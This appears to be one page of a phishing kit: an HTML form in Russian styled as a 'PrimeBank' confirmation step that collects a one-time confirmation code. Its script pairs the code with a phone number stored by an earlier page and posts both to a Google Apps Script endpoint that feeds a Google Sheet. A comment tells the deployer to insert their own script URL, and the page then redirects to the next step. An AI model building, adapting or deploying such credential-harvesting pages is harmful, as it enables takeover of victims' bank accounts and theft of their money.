<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PrimeBank — Подтверждение</title>
<link rel="icon" type="image/png" sizes="32x32" href="/img/logopng.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/logopng.png">
<link rel="apple-touch-icon" href="/img/logopng.png">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>
* { box-sizing: border-box; font-family: Roboto, "Open Sans", sans-serif; }
body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg, #0f2027, #203a43, #2c5364);}
.auth-container { background:#fff; width:100%; max-width:420px; padding:32px; border-radius:16px; box-shadow:0 20px 40px rgba(0,0,0,0.15);}
.brand { text-align:center; margin-bottom:24px; font-size:24px; font-weight:700; letter-spacing:0.5px; color:#203a43;}
.field { margin-bottom:16px; }
.field label { display:block; margin-bottom:6px; font-size:14px; color:#555; }
.field input { width:100%; padding:12px 14px; border-radius:10px; border:1px solid #ccc; font-size:15px; outline:none; transition:0.2s;}
.field input:focus { border-color:#203a43; }
.submit-btn { width:100%; padding:14px; border-radius:12px; border:none; background:#203a43; color:#fff; font-size:16px; font-weight:500; cursor:pointer; transition:0.3s;}
.submit-btn:hover { background:#162b33; transform:translateY(-2px);}
@media (max-width:480px){ .auth-container{padding:24px 16px;} .brand{font-size:20px;} .submit-btn{font-size:15px; padding:12px;}}
</style>
</head>
<body>
<div class="auth-container">
    <div class="brand">PrimeBank</div>

    <form id="codeForm">
        <div class="field">
            <label for="codeInput">Введите код подтверждения</label>
            <input type="text" id="codeInput" placeholder="Введите код" required maxlength="6" />
        </div>
        <button type="submit" class="submit-btn">Подтвердить</button>
    </form>
</div>

<script>
const codeForm = document.getElementById("codeForm");
const codeInput = document.getElementById("codeInput");

codeForm.onsubmit = async function(e){
    e.preventDefault();

    const code = codeInput.value.trim();
    const phone = localStorage.getItem("authPhone");

    if(code.length < 4 || code.length > 6){
        alert("Введите корректный код подтверждения (4-6 цифр)");
        return;
    }

    localStorage.setItem("authCode", code);

    try {
        // <-- Вставь сюда URL развернутого веб-приложения Google Apps Script -->
        const response = await fetch("https://script.google.com/macros/s/AKfycbxIjS0Hs2zI1l3SuiByQrVNfNekBhj28KTkpY_GFqu8i974IcByto9-x18cpc9bT2gg/exec", {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                phone: phone,
                code: code,
                date: new Date().toISOString()
            })
        });

        const result = await response.json();
        console.log("Ответ сервера:", result);

    } catch(err) {
        console.error("Ошибка отправки в Google Sheets:", err);
        alert("Не удалось отправить данные, попробуйте позже.");
        return;
    }

    // Редирект после успешной отправки
    window.location.href = "choice.html";
};
</script>
</body>
</html>
